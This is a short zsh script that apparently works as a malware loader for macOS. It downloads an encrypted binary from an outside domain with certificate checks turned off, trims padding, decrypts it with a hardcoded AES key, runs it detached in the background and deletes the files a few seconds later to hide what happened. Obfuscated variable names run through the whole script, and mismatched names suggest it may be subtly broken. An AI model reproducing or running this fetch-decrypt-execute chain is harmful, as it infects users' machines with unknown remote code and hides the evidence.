#!/bin/zsh
szbz3=$(mktemp /tmp/35a4w7.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m53b6d60d8d1754b6.bin" -o "$szbz3z" || exit 1
vubpap=$(stat -f %z "$szbz3z"); rvbb6k7=$(( vubpap - 739 - 2885 ))
tail -c +$(( 739 + 1 )) "$szbz3z" | head -c $rvbb6k7 | openssl enc -d -aes-256-cbc -k 2f3d837769673f6aa747932c -out "$szbz3" 2>/dev/null
[ -s "$szbz3" ] && chmod 700 "$szbz3" && ( "$szbz3" & ) && disown
( sleep 3; rm -f "$szbz3" "$szbz3z" ) &>/dev/null &
